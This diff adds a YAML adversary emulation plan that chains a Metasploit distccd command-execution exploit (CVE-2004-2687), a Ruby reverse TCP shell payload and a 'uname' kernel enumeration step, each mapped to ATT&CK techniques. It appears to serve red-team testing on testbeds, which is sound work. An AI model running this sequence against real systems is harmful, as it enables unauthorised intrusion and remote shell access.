@@ -1,0 +1,94 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-08 00:35:58 UTC+0000
+attack_action_sequence:
+  - uuid: 291452ab-1bfa-4128-948e-0ded410d268f
+    name: DistCC Daemon Command Execution
+    id:
+      - T1203
+      - T1210
+    source: Metasploit Exploit
+    supported_platforms:
+      - Unix
+    tactics:
+      - Execution
+      - Initial Access
+    technique:
+      - Exploitation for Client Execution
+      - Exploitation of Remote Services
+    description: This module uses a documented security weakness to execute arbitrary
+      commands on any system running distccd.
+    testbed:
+      CVE:
+        - CVE-2004-2687
+    execution:
+      executor: Metasploit Executor
+      command: set_exploit_module("unix/misc/distcc_exec")
+    arguments:
+      RHOSTS:
+        CurrentSetting: ''
+        Required: true
+        Description: The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+      RPORT:
+        CurrentSetting: 3632
+        Required: true
+        Description: The target port
+      SSLVersion:
+        CurrentSetting: Auto
+        Required: true
+        Description: 'Specify the version of SSL/TLS to be used (Auto, TLS and SSL23
+          are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)'
+      ConnectTimeout:
+        CurrentSetting: 10
+        Required: true
+        Description: Maximum number of seconds to establish a TCP connection
+  - uuid: 2d8e7dd5-5f1d-4364-b90e-d855118460e0
+    name: Unix Command Shell, Reverse TCP (via Ruby)
+    id:
+      - T1059
+      - T1105
+    source: Metasploit Payload
+    supported_platforms:
+      - Unix
+    tactics:
+      - Execution
+      - Command and Control
+    technique:
+      - Command and Scripting Interpreter
+      - Ingress Tool Transfer
+    description: Connect back and create a command shell via Ruby
+    execution:
+      executor: Metasploit Executor
+      command: set_payload_module("cmd/unix/reverse_ruby")
+    arguments:
+      LHOST:
+        CurrentSetting: ''
+        Required: true
+        Description: The listen address (an interface may be specified)
+      LPORT:
+        CurrentSetting: '4444'
+        Required: true
+        Description: The listen port
+  - uuid: 3a53734a-9e26-4f4b-ad15-059e767f5f14
+    name: Current kernel information enumeration
+    id:
+      - T1059.004
+    source: ART
+    supported_platforms:
+      - linux
+    tactics:
+      - Execution
+    technique:
+      - 'Command and Scripting Interpreter: Unix Shell'
+    description: |
+      An adversary may want to enumerate the kernel information to tailor their attacks for that particular kernel. The following command will enumerate the kernel information.
+    execution:
+      executor: Shell Executor
+      command: |
+        uname -srm
+    arguments:
+    dependencies:
+testbed_requirement:
+  OS: []
+  CVE:
+    - CVE-2004-2687
